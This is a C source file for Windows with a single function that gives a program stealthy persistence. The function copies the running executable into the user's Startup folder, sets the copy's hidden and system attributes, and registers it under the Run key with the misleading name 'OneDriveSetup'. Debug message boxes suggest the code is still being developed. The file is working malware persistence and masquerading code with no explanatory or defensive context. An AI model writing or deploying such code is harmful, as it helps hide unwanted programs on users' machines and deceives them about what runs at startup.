#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

void add_persistence_reg(void) {
    HKEY hKey;
    char original_path[MAX_PATH];
    char new_path[MAX_PATH];
    
    MessageBoxA(NULL, "Persistence function entered", "Debug", MB_OK);
    
    GetModuleFileNameA(NULL, original_path, MAX_PATH);
    
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, new_path))) {
        MessageBoxA(NULL, "SHGetFolderPathA failed", "Debug", MB_OK);
        strcpy(new_path, original_path);
    } else {
        MessageBoxA(NULL, "SHGetFolderPathA succeeded", "Debug", MB_OK);
        strcat(new_path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
        char *filename = strrchr(original_path, '\\');
        if (filename) filename++;
        else filename = original_path;
        strcat(new_path, filename);
    }
    
    if (strcmp(original_path, new_path) != 0) {
        if (CopyFileA(original_path, new_path, FALSE)) {
            MessageBoxA(NULL, "CopyFile succeeded", "Debug", MB_OK);
            SetFileAttributesA(new_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        } else {
            MessageBoxA(NULL, "CopyFile failed", "Debug", MB_OK);
        }
    }
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveSetup", 0, REG_SZ, (BYTE*)new_path, lstrlenA(new_path) + 1);
        RegCloseKey(hKey);
        MessageBoxA(NULL, "Registry key written", "Debug", MB_OK);
    } else {
        MessageBoxA(NULL, "Failed to open registry key", "Debug", MB_OK);
    }
}
